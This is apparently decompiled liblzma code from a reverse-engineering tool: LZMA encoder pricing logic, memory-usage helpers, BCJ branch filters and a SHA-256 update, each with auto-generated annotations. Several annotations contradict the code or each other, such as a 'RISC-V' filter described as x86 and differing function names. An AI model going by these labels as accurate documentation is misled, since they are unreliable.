        if (uVar24 < 0x80000) {
          uVar27 = (ulong)((byte)(&dist_slot_log2_table)[uVar24 >> 6] + 0xc);
        }
        else if ((int)uVar24 < 0) {
          uVar27 = (ulong)((byte)(&dist_slot_log2_table)[uVar24 >> 0x1e] + 0x3c);
        }
        else {
          uVar27 = (ulong)((byte)(&dist_slot_log2_table)[uVar24 >> 0x12] + 0x24);
        }
        iVar49 = *(int *)(param_1 + 8 + (uVar27 + 0x409c + uVar37 * 0x40) * 4) +
                 *(int *)(param_1 + 0x10e80 + (ulong)(uVar24 & 0xf) * 4);
      }
      uVar32 = (uint)bVar8 + iVar14 +
               *(int *)(param_1 + 0x71ec + ((ulong)(uVar31 - 2) + 0x100 + uVar28 * 0x110) * 4) +
               iVar49;
      lVar18 = param_1 + (ulong)(uVar31 + local_138) * 0x2c;
      if (uVar32 < *(uint *)(lVar18 + 0x10edc)) {
        *(uint *)(lVar18 + 0x10edc) = uVar32;
        *(uint *)(lVar18 + 0x10ee0) = local_138;
        *(uint *)(lVar18 + 0x10ee4) = uVar24 + 4;
        *(undefined1 *)(lVar18 + 0x10ed0) = 0;
      }
      uVar22 = uVar31 + 1;
      if (uVar31 == *(uint *)(lVar26 + 0x2dc)) {
        uVar45 = uVar29 + uVar22;
        if (uVar41 < uVar29 + uVar22) {
          uVar45 = uVar41;
        }
        if (uVar22 < uVar45) {
          uVar35 = uVar22;
LAB_0011be60:
          uVar36 = *(long *)((long)psVar17 + (ulong)uVar35) -
                   *(long *)((long)psVar17 + (ulong)uVar35 + ~(ulong)uVar24);
          if (uVar36 == 0) goto code_r0x0011be71;
          uVar2 = 0;
          for (; (uVar36 & 1) == 0; uVar36 = uVar36 >> 1 | 0x8000000000000000) {
            uVar2 = uVar2 + 1;
          }
          uVar35 = (uVar2 >> 3) + uVar35;
          if (uVar35 < uVar45) {
            uVar45 = uVar35;
          }
LAB_0011be78:
          uVar35 = (uVar45 - uVar31) - 1;
          if (1 < uVar35) {
            uVar23 = *(uint *)(param_1 + 0xb78);
            uVar2 = (uVar15 - 1) + uVar22;
            uVar50 = uVar23 & uVar2;
            bVar9 = (&prob_price_table)
                    [*(ushort *)(param_1 + 4 + ((ulong)uVar50 + 0x35c0 + (ulong)uVar30 * 0x10) * 2)
                     >> 4];
            iVar49 = lzma_decode_huffman_symbol
                               (param_1,uVar2,*(char *)((long)psVar17 + (ulong)(uVar31 - 1)),1,
                                *(char *)((long)psVar17 + uVar25 + ~(ulong)uVar24),
                                *(char *)((long)psVar17 + uVar25));
            uVar36 = (ulong)(uVar50 + 1 & uVar23);
            lVar26 = param_1 + (ulong)uVar39 * 2;
            lVar18 = param_1 + ((ulong)uVar39 * 0x10 + uVar36) * 2;
            bVar10 = (&prob_price_table)[*(ushort *)(lVar18 + 0x6b84) >> 4 ^ 0x7f];
            bVar11 = (&prob_price_table)[*(ushort *)(lVar26 + 0x6d04) >> 4 ^ 0x7f];
            uVar35 = uVar35 + local_138 + uVar22;
            if (local_134 < uVar35) {
              uVar2 = local_134 + 1;
              puVar20 = (undefined4 *)(param_1 + 0x10edc + (ulong)uVar2 * 0x2c);
              uVar23 = ~local_134;
              do {
                *puVar20 = 0x40000000;
                puVar20 = puVar20 + 0xb;
                local_134 = uVar35;
              } while ((undefined4 *)(lVar43 + ((ulong)(uVar23 + uVar35) + (ulong)uVar2) * 0x2c) !=
                       puVar20);
            }
            lVar19 = param_1 + (ulong)uVar35 * 0x2c;
            uVar31 = iVar49 + (uint)bVar11 +
                              (uint)(byte)(&prob_price_table)[*(ushort *)(lVar26 + 0x6d1c) >> 4] +
                              (uint)bVar9 + (uint)bVar10 +
                              (uint)(byte)(&prob_price_table)[*(ushort *)(lVar18 + 0x6d64) >> 4 ^ 0x7f]
                              + uVar32 +
                              *(int *)(param_1 + 0xba34 +
                                      ((ulong)((uVar45 - uVar31) - 3) + 0x100 + uVar36 * 0x110) * 4)
            ;
            if (uVar31 < *(uint *)(lVar19 + 0x10edc)) {
              *(uint *)(lVar19 + 0x10edc) = uVar31;
              *(undefined2 *)(lVar19 + 0x10ed0) = 0x101;
              *(uint *)(lVar19 + 0x10ee0) = local_138 + uVar22;
              *(undefined4 *)(lVar19 + 0x10ee4) = 0;
              *(uint *)(lVar19 + 0x10ed4) = local_138;
              *(uint *)(lVar19 + 0x10ed8) = uVar24 + 4;
            }
          }
        }
        local_128 = local_128 + 1;
        if (local_128 == local_fc) break;
        uVar36 = (ulong)local_128;
      }
      uVar25 = (ulong)uVar22;
    } while( true );
  }
LAB_0011b780:
  local_138 = local_114;
  if (local_134 <= local_114) goto LAB_0011c588;
  goto LAB_0011b228;
code_r0x0011be71:
  uVar35 = uVar35 + 8;
  if (uVar45 <= uVar35) goto LAB_0011be78;
  goto LAB_0011be60;
LAB_0011c588:
  lVar43 = param_1 + uVar46 * 0x2c;
  *(uint *)(param_1 + 0x10ec4) = local_114;
  uVar29 = *(uint *)(lVar43 + 0x10ee0);
  uVar21 = *(undefined4 *)(lVar43 + 0x10ee4);
  while( true ) {
    uVar41 = uVar29;
    lVar43 = param_1 + uVar46 * 0x2c;
    uVar46 = (ulong)uVar41;
    if (*(char *)(lVar43 + 0x10ed0) == '\0') {
      uVar29 = *(uint *)(param_1 + 0x10ee0 + uVar46 * 0x2c);
    }
    else {
      lVar26 = param_1 + 0x10ecc + uVar46 * 0x2c;
      lVar18 = uVar46 * 0x2c + param_1;
      *(undefined1 *)(lVar26 + 4) = 0;
      cVar6 = *(char *)(lVar43 + 0x10ed1);
      *(undefined4 *)(lVar26 + 0x18) = 0xffffffff;
      uVar29 = uVar41 - 1;
      *(uint *)(lVar18 + 0x10ee0) = uVar29;
      if (cVar6 != '\0') {
        lVar26 = param_1 + (ulong)uVar29 * 0x2c;
        *(undefined4 *)(lVar26 + 0x10ee0) = *(undefined4 *)(lVar43 + 0x10ed4);
        uVar40 = *(undefined4 *)(lVar43 + 0x10ed8);
        *(undefined1 *)(lVar26 + 0x10ed0) = 0;
        *(undefined4 *)(lVar26 + 0x10ee4) = uVar40;
        uVar29 = *(uint *)(lVar18 + 0x10ee0);
      }
    }
    lVar43 = param_1 + uVar46 * 0x2c;
    *(uint *)(lVar43 + 0x10ee0) = local_114;
    uVar40 = *(undefined4 *)(lVar43 + 0x10ee4);
    *(undefined4 *)(lVar43 + 0x10ee4) = uVar21;
    if (uVar41 == 0) break;
    uVar46 = (ulong)uVar41;
    uVar21 = uVar40;
    local_114 = uVar41;
  }
  *(uint *)(param_1 + 0x10ec8) = *(uint *)(param_1 + 0x10ee0);
  *param_4 = *(uint *)(param_1 + 0x10ee0);
  *param_3 = *(int *)(param_1 + 0x10ee4);
  goto LAB_0011ae52;
}



/**
 * @name  lzma_lzma_encoder_set_limits
 * @brief Sets output size limit and flag on LZMA encoder state
 * @confidence 80%
 * @classification utility
 * @address 0x0011ccb0
 */

/* Sets encoder limit fields at offsets 0x6e98 and 0x6ea0 */

void lzma_lzma_encoder_set_limits(long param_1,undefined8 param_2,undefined1 param_3)

{
  *(undefined8 *)(param_1 + 0x6e98) = param_2;
  *(undefined1 *)(param_1 + 0x6ea0) = param_3;
  return;
}



/**
 * @name  lzma_lzma_encoder_store_state
 * @brief Stores encoding state values to large encoder structure at fixed offsets. Sets error state conditionally.
 * @confidence 55%
 * @classification utility
 * @address 0x0011e330
 */

/* Stores encoding state values to a large structure at fixed offsets (0x6e6c, 0x6e70, 0x6e98,
   etc.). Conditionally sets error state (0xffffffff) based on position and buffer condition checks.
    */

void store_encoding_state
               (undefined8 param_1,long param_2,undefined8 param_3,undefined8 param_4,
               undefined8 param_5,undefined8 *param_6,undefined8 param_7,undefined8 param_8,
               undefined4 param_9,long param_10,undefined8 param_11,undefined4 param_12,
               undefined8 param_13,undefined8 param_14,undefined8 param_15,long param_16)

{
  int in_EAX;
  long unaff_RBX;
  undefined4 unaff_EBP;
  long lVar1;
  long in_R10;
  undefined4 in_R11D;
  undefined4 unaff_R12D;
  undefined4 unaff_R14D;
  undefined4 in_stack_00000070;
  
  *(undefined8 *)(unaff_RBX + 0x6ea8) = param_5;
  *(undefined4 *)(unaff_RBX + 0x6eb0) = unaff_R14D;
  *(long *)(param_10 + 8) = in_R10;
  *(undefined8 *)(param_10 + 0x10) = param_7;
  *(undefined4 *)(unaff_RBX + 0x6e6c) = unaff_EBP;
  *(undefined4 *)(unaff_RBX + 0x6e78) = param_12;
  *(undefined4 *)(unaff_RBX + 0x6e70) = unaff_R12D;
  *(undefined4 *)(unaff_RBX + 0x6e7c) = (undefined4)param_13;
  *(undefined4 *)(unaff_RBX + 0x6e74) = 0;
  *(undefined4 *)(unaff_RBX + 0x6e80) = param_13._4_4_;
  *param_6 = param_4;
  *(undefined4 *)(unaff_RBX + 0x6e84) = (undefined4)param_14;
  *(undefined4 *)(unaff_RBX + 0x6eb8) = in_R11D;
  *(undefined4 *)(unaff_RBX + 0x6e88) = in_stack_00000070;
  *(undefined4 *)(unaff_RBX + 0x6eb4) = param_14._4_4_;
  *(undefined4 *)(unaff_RBX + 0x6ebc) = param_9;
  if ((((param_2 == -1) ||
       (lVar1 = (param_2 + param_16) - in_R10, *(long *)(unaff_RBX + 0x6e98) = lVar1, lVar1 != 0))
      || (in_EAX != 0)) && (in_EAX == 1)) {
    *(undefined4 *)(unaff_RBX + 0x6e6c) = 0xffffffff;
    *(undefined8 *)(unaff_RBX + 0x6e70) = 0x500000000;
    *(undefined4 *)(unaff_RBX + 0x6ea4) = 1;
  }
  return;
}



/**
 * @name  lzma_lzma_encoder_memusage
 * @brief Computes LZMA encoder memory usage as match_finder_memusage + 0x6ec0
 * @confidence 85%
 * @classification utility
 * @address 0x00120500
 */

/* Computes encoder memory with 0x6ec0 offset */

long lzma_lzma_encoder_memusage_helper(undefined4 *param_1)

{
  long lVar1;
  
  lVar1 = FUN_00118790(*param_1);
  return lVar1 + 0x6ec0;
}



/**
 * @name  lzma_lzma_decoder_memusage_full
 * @brief Validates lc/lp/pb LZMA parameters then computes decoder memory usage
 * @confidence 80%
 * @classification utility
 * @address 0x00120520
 */

/* Validates LZMA properties then computes offset-based memory usage */

long lzma_lzma_decoder_memusage_full(undefined4 *param_1)

{
  long lVar1;
  
  if ((uint)param_1[5] < 5) {
    if ((((uint)param_1[6] < 5) && ((uint)(param_1[5] + param_1[6]) < 5)) && ((uint)param_1[7] < 5))
    {
      lVar1 = FUN_00118790(*param_1);
      return lVar1 + 0x6ec0;
    }
  }
  return -1;
}



/**
 * @name  lzma_lzma2_encoder_memusage
 * @brief Computes LZMA2 encoder memory usage with 0x100a8 overhead added
 * @confidence 85%
 * @classification utility
 * @address 0x00120d00
 */

/* Computes LZMA2 encoder memory usage with 0x100a8 offset */

long lzma_lzma2_encoder_memusage(void)

{
  long lVar1;
  
  lVar1 = FUN_0011a770();
  if (lVar1 != -1) {
    lVar1 = lVar1 + 0x100a8;
  }
  return lVar1;
}



/**
 * @name  lzma_lzma_lclppb_decode
 * @brief Computes next power of two for dictionary size and maps to a log2 table index for LZMA encoding parameter.
 * @confidence 60%
 * @classification utility
 * @address 0x00120d30
 */

/* Computes the next power of two for a given size value and looks up a corresponding index in a log
   table, storing a result in output. */

undefined8 next_power_of_two_to_log_table_index(uint *param_1,char *param_2)

{
  uint uVar1;
  
  if (param_1 == (uint *)0x0) {
    return 0xb;
  }
  uVar1 = 0x1000;
  if (0xfff < *param_1) {
    uVar1 = *param_1;
  }
  uVar1 = uVar1 - 1 | uVar1 - 1 >> 2;
  uVar1 = uVar1 | uVar1 >> 3;
  uVar1 = uVar1 >> 4 | uVar1;
  uVar1 = uVar1 | uVar1 >> 8;
  uVar1 = uVar1 >> 0x10 | uVar1;
  if (uVar1 == 0xffffffff) {
    *param_2 = '(';
    return 0;
  }
  uVar1 = uVar1 + 1;
  if (uVar1 < 0x2000) {
    *param_2 = (&dist_slot_log2_table)[uVar1] - 0x18;
    return 0;
  }
  if (0x1ffffff < uVar1) {
    *param_2 = (&dist_slot_log2_table)[uVar1 >> 0x18] + '\x18';
    return 0;
  }
  *param_2 = (&dist_slot_log2_table)[uVar1 >> 0xc];
  return 0;
}



/**
 * @name  lzma_lzma_decoder_memusage
 * @brief Calculates decoder memory from dict size (3x), minimum 1MB, validates dict range
 * @confidence 85%
 * @classification utility
 * @address 0x00120df0
 */

/* Calculates decoder memory from dict size, clamped min 0x100000 */

ulong lzma_lzma_decoder_memusage(uint *param_1)

{
  ulong uVar1;
  
  uVar1 = 0xffffffffffffffff;
  if ((*param_1 - 0x1000 < 0x5ffff001) && (uVar1 = (ulong)*param_1 * 3, uVar1 < 0x100000)) {
    uVar1 = 0x100000;
  }
  return uVar1;
}



/**
 * @name  lzma_lzma_encoder_memusage_with_offset
 * @brief Computes encoder memory usage plus 0xb8 offset (likely for additional state)
 * @confidence 60%
 * @classification utility
 * @address 0x00121260
 */

/* Returns compute_offset_value() + 0xb8 */

long get_lzma_encoder_tables_offset(void)

{
  long lVar1;
  
  lVar1 = lzma_lzma_encoder_memusage_helper();
  return lVar1 + 0xb8;
}



/**
 * @name  lzma_simple_props_validate
 * @brief Validates simple filter properties: checks null, zero marker, and start_offset range
 * @confidence 75%
 * @classification utility
 * @address 0x00121470
 */

/* Validates simple filter props, returns 0x161 if valid or -1 */

long lzma_simple_props_validate(int *param_1)

{
  if ((param_1 != (int *)0x0) && (*param_1 == 0)) {
    return (ulong)(-(uint)(param_1[1] - 1U < 0x100) & 0x161) - 1;
  }
  return -1;
}



/**
 * @name  lzma_delta_props_size
 * @brief Sets output size to 0 or 4 based on whether delta options are present
 * @confidence 75%
 * @classification utility
 * @address 0x00121d00
 */

/* Sets output to 0 or 4 based on whether options are non-null/non-zero */

undefined8 lzma_delta_props_encode_size(undefined4 *param_1,int *param_2)

{
  undefined4 uVar1;
  
  uVar1 = 0;
  if ((param_2 != (int *)0x0) && (uVar1 = 0, *param_2 != 0)) {
    uVar1 = 4;
  }
  *param_1 = uVar1;
  return 0;
}



/**
 * @name  bcj_powerpc_filter
 * @brief PowerPC BCJ filter: detects branch instructions (opcode 0x48 pattern) and adjusts 26-bit relative addresses.
 * @confidence 78%
 * @classification utility
 * @address 0x00122010
 */

long FUN_00122010(undefined8 param_1,int param_2,char param_3,long param_4,ulong param_5)

{
  byte bVar1;
  byte bVar2;
  long lVar3;
  int iVar4;
  
  if (param_5 < 4) {
    return 0;
  }
  lVar3 = 4;
  while( true ) {
    bVar1 = *(byte *)(param_4 - 4 + lVar3);
    if ((bVar1 >> 2 == 0x12) && (bVar2 = *(byte *)(param_4 - 1 + lVar3), (bVar2 & 3) == 1)) {
      iVar4 = param_2 - 4 + (int)lVar3;
      if (param_3 == '\0') {
        iVar4 = -iVar4;
      }
      iVar4 = ((bVar1 & 3) << 0x18 |
              (uint)*(byte *)(param_4 - 3 + lVar3) << 0x10 |
              (uint)*(byte *)(param_4 - 2 + lVar3) << 8 | bVar2 & 0xfc) + iVar4;
      *(char *)(param_4 - 2 + lVar3) = (char)((uint)iVar4 >> 8);
      *(byte *)(param_4 - 4 + lVar3) = (byte)((uint)iVar4 >> 0x18) & 3 | 0x48;
      *(byte *)(param_4 - 1 + lVar3) = (byte)iVar4 | 1;
      *(char *)(param_4 - 3 + lVar3) = (char)((uint)iVar4 >> 0x10);
    }
    if (param_5 < lVar3 + 4U) break;
    lVar3 = lVar3 + 4;
  }
  return lVar3;
}



/**
 * @name  bcj_sparc_filter
 * @brief SPARC BCJ filter: processes 4-byte aligned instructions, detects opcode 0xeb pattern and adjusts relative branch targets.
 * @confidence 75%
 * @classification utility
 * @address 0x00122370
 */

/* Processes and adjusts relative jump instructions (0xeb) in a buffer by updating their
   displacement values based on offset calculations. Iterates through buffer in 4-byte chunks. */

long process_relative_jumps(undefined8 param_1,int param_2,char param_3,byte *param_4,ulong param_5)

{
  uint uVar1;
  int iVar2;
  long lVar3;
  
  if (param_5 < 4) {
    return 0;
  }
  lVar3 = 4;
  while( true ) {
    if (param_4[3] == 0xeb) {
      if (param_3 == '\0') {
        iVar2 = (-4 - param_2) - (int)lVar3;
      }
      else {
        iVar2 = param_2 + 4 + (int)lVar3;
      }
      uVar1 = ((uint)param_4[2] << 0x10 | (uint)param_4[1] << 8 | (uint)*param_4) * 4 + iVar2;
      param_4[2] = (byte)(uVar1 >> 0x12);
      *param_4 = (byte)(uVar1 >> 2);
      param_4[1] = (byte)(uVar1 >> 10);
    }
    if (param_5 < lVar3 + 4U) break;
    lVar3 = lVar3 + 4;
    param_4 = param_4 + 4;
  }
  return lVar3;
}



/**
 * @name  bcj_armthumb_filter
 * @brief ARM Thumb BCJ filter: processes 2-byte aligned instructions with BL/BLX patterns (0xF0/0xF8), adjusts 21-bit offsets.
 * @confidence 80%
 * @classification utility
 * @address 0x00122480
 */

/* Processes ARM 32-bit instructions with bit field relocations. Handles instructions with specific
   patterns (bits 0xf0 and 0xf8), extracting and relocating 21-bit offsets. */

long relocate_arm_instructions
               (undefined8 param_1,int param_2,char param_3,long param_4,ulong param_5)

{
  byte *pbVar1;
  byte *pbVar2;
  byte *pbVar3;
  byte *pbVar4;
  byte bVar5;
  byte bVar6;
  ulong uVar7;
  uint uVar8;
  int iVar9;
  long lVar10;
  
  if (param_5 < 4) {
    return 0;
  }
  lVar10 = 0;
  do {
    pbVar3 = (byte *)(param_4 + 1 + lVar10);
    bVar5 = *pbVar3;
    if ((bVar5 & 0xf8) == 0xf0) {
      pbVar4 = (byte *)(param_4 + 3 + lVar10);
      bVar6 = *pbVar4;
      if ((bVar6 & 0xf8) != 0xf8) goto LAB_001224b0;
      pbVar1 = (byte *)(param_4 + lVar10);
      pbVar2 = (byte *)(param_4 + lVar10 + 2);
      if (param_3 == '\0') {
        iVar9 = (-4 - param_2) - (int)lVar10;
      }
      else {
        iVar9 = param_2 + 4 + (int)lVar10;
      }
      uVar8 = ((bVar6 & 7) << 8 | (bVar5 & 7) << 0x13 | (uint)*pbVar1 << 0xb | (uint)*pbVar2) * 2 +
              iVar9;
      uVar7 = lVar10 + 8;
      lVar10 = lVar10 + 4;
      *pbVar3 = (byte)(uVar8 >> 0x14) & 7 | 0xf0;
      *pbVar1 = (byte)(uVar8 >> 0xc);
      *pbVar4 = (byte)(uVar8 >> 9) | 0xf8;
      *pbVar2 = (byte)(uVar8 >> 1);
    }
    else {
LAB_001224b0:
      uVar7 = lVar10 + 6;
      lVar10 = lVar10 + 2;
    }
    if (param_5 < uVar7) {
      return lVar10;
    }
  } while( true );
}



/**
 * @name  bcj_arm64_filter
 * @brief ARM64/AArch64 BCJ filter: adjusts BL (branch-link, opcode 0x94) and ADRP instructions with 21-bit offset fields.
 * @confidence 82%
 * @classification utility
 * @address 0x00122600
 */

/* Relocates ARM Thumb instructions with two specific patterns: 0x25 (branch) and 0x90 (adrp-like).
   Processes 22-bit and 21-bit offset fields respectively. */

long relocate_arm_thumb_instructions
               (undefined8 param_1,int param_2,char param_3,long param_4,ulong param_5)

{
  uint uVar1;
  uint uVar2;
  long lVar3;
  uint uVar4;
  
  if (param_5 < 4) {
    return 0;
  }
  lVar3 = 4;
  while( true ) {
    uVar1 = *(uint *)(param_4 - 4 + lVar3);
    uVar2 = param_2 - 4 + (int)lVar3;
    if (uVar1 >> 0x1a == 0x25) {
      uVar2 = uVar2 >> 2;
      if (param_3 == '\0') {
        uVar2 = -uVar2;
      }
      *(uint *)(param_4 - 4 + lVar3) = uVar2 + uVar1 & 0x3ffffff | 0x94000000;
    }
    else if (((uVar1 & 0x9f000000) == 0x90000000) &&
            (uVar4 = uVar1 >> 0x1d & 3 | uVar1 >> 3 & 0x1ffffc, (uVar4 + 0x20000 & 0x1c0000) == 0))
    {
      uVar2 = uVar2 >> 0xc;
      if (param_3 == '\0') {
        uVar2 = -uVar2;
      }
      uVar2 = uVar2 + uVar4;
      *(uint *)(param_4 - 4 + lVar3) =
           -(uVar2 & 0x20000) & 0xe00000 |
           uVar2 * 8 & 0x1fffe0 | (uVar2 & 3) << 0x1d | uVar1 & 0x9000001f;
    }
    if (param_5 < lVar3 + 4U) break;
    lVar3 = lVar3 + 4;
  }
  return lVar3;
}



/**
 * @name  bcj_riscv_filter
 * @brief RISC-V BCJ filter: detects AUIPC (0x17) and JAL (0x6F) patterns with specific opcode bits, relocates 22-bit offsets.
 * @confidence 72%
 * @classification utility
 * @address 0x00122780
 */

/* Processes x86 branch instructions in a buffer, relocating them based on a delta offset. Handles
   0x40 and 0x7f opcode patterns with specific bit field manipulations. */

long relocate_x86_instructions
               (undefined8 param_1,int param_2,char param_3,long param_4,ulong param_5)

{
  byte bVar1;
  byte bVar2;
  uint uVar3;
  long lVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  
  if (param_5 < 4) {
    return 0;
  }
  lVar4 = 4;
  do {
    bVar1 = *(byte *)(param_4 - 4 + lVar4);
    if (bVar1 == 0x40) {
      bVar2 = *(byte *)(param_4 - 3 + lVar4);
      if ((bVar2 & 0xc0) == 0) {
LAB_001227dc:
        iVar7 = param_2 - 4 + (int)lVar4;
        iVar5 = -iVar7;
        if (param_3 != '\0') {
          iVar5 = iVar7;
        }
        uVar3 = ((uint)*(byte *)(param_4 - 2 + lVar4) << 8 | (uint)bVar1 << 0x18 |
                 (uint)*(byte *)(param_4 - 1 + lVar4) | (uint)bVar2 << 0x10) * 4 + iVar5;
        uVar6 = uVar3 >> 2 & 0x3fffff;
        iVar5 = ((int)(uVar3 * 0x80) >> 0x1f & 0xffU) << 0x16;
        *(byte *)(param_4 - 4 + lVar4) = (byte)((uint)iVar5 >> 0x18) | 0x40;
        *(byte *)(param_4 - 3 + lVar4) = (byte)(uVar6 >> 0x10) | (byte)((uint)iVar5 >> 0x10);
        *(char *)(param_4 - 2 + lVar4) = (char)(uVar6 >> 8);
        *(char *)(param_4 - 1 + lVar4) = (char)uVar6;
      }
    }
    else if ((bVar1 == 0x7f) && (bVar2 = *(byte *)(param_4 - 3 + lVar4), (bVar2 & 0xc0) == 0xc0))
    goto LAB_001227dc;
    if (param_5 < lVar4 + 4U) {
      return lVar4;
    }
    lVar4 = lVar4 + 4;
  } while( true );
}



/* ==================== General ==================== */

/**
 * @name  lzma_stream_encoder_mt_end
 * @confidence 85%
 * @classification 
 * @address 0x001126b0
 */

/* Cleans up MT stream encoder: stops threads, frees filters, index, etc. */

void lzma_stream_encoder_mt_end(long param_1,undefined8 param_2)

{
  stop_worker_threads();
  lzma_outq_drain(param_1 + 0x1e8,param_2);
  lzma_next_coder_end(param_1 + 8,param_2);
  lzma_filters_free(param_1 + 0x128,param_2);
  lzma_index_hash_end(*(undefined8 *)(param_1 + 0x1b0),param_2);
  lzma_free(param_1,param_2);
  return;
}



/**
 * @name  sha
 * @confidence 0%
 * @classification 
 * @address 0x001163b0
 */

/* Feeds input data into a hash context with a 64-byte (0x40) internal buffer. Copies data into the
   buffer, tracks total bytes processed at ctx+0x60, and when the buffer is full (aligned to 64
   bytes), calls the block compression function. Handles arbitrary-length streaming input. */

void hash_update_streaming(undefined8 *param_1,ulong param_2,long param_3)

{
  ulong uVar1;
  uint uVar2;
  ulong uVar3;
  undefined8 *puVar4;
  long lVar5;
  uint uVar6;
  
  if (param_2 == 0) {
    return;
  }
  do {
    lVar5 = *(long *)(param_3 + 0x60);
    uVar3 = (ulong)((uint)lVar5 & 0x3f);
    uVar1 = 0x40 - uVar3;
    if (param_2 < uVar1) {
      uVar1 = param_2;
    }
    puVar4 = (undefined8 *)(uVar3 + param_3);
    uVar2 = (uint)uVar1;
    if (uVar2 < 8) {
      if ((uVar1 & 4) == 0) {
        if (uVar2 != 0) {
          *(undefined1 *)puVar4 = *(undefined1 *)param_1;
          if ((uVar1 & 2) == 0) goto LAB_001163fb;
          *(undefined2 *)((long)puVar4 + ((uVar1 & 0xffffffff) - 2)) =
               *(undefined2 *)((long)param_1 + ((uVar1 & 0xffffffff) - 2));
          lVar5 = *(long *)(param_3 + 0x60);
        }
      }
      else {
        *(undefined4 *)puVar4 = *(undefined4 *)param_1;
        *(undefined4 *)((long)puVar4 + ((uVar1 & 0xffffffff) - 4)) =
             *(undefined4 *)((long)param_1 + ((uVar1 & 0xffffffff) - 4));
        lVar5 = *(long *)(param_3 + 0x60);
      }
    }
    else {
      *puVar4 = *param_1;
      *(undefined8 *)((long)puVar4 + ((uVar1 & 0xffffffff) - 8)) =
           *(undefined8 *)((long)param_1 + ((uVar1 & 0xffffffff) - 8));
      lVar5 = (long)puVar4 - ((ulong)(puVar4 + 1) & 0xfffffffffffffff8);
      uVar2 = (int)lVar5 + uVar2 & 0xfffffff8;
      if (7 < uVar2) {
        uVar3 = 0;
        do {
          uVar6 = (int)uVar3 + 8;
          *(undefined8 *)(((ulong)(puVar4 + 1) & 0xfffffffffffffff8) + uVar3) =
               *(undefined8 *)((long)param_1 + (uVar3 - lVar5));
          uVar3 = (ulong)uVar6;
        } while (uVar6 < uVar2);
      }
LAB_001163fb:
      lVar5 = *(long *)(param_3 + 0x60);
    }
    param_1 = (undefined8 *)((long)param_1 + uVar1);
    param_2 = param_2 - uVar1;
    *(ulong *)(param_3 + 0x60) = uVar1 + lVar5;
    if ((uVar1 + lVar5 & 0x3f) == 0) {
      sha256_transform(param_3 + 0x40,param_3);
    }
    if (param_2 == 0) {
      return;
    }
  } while( true );
}


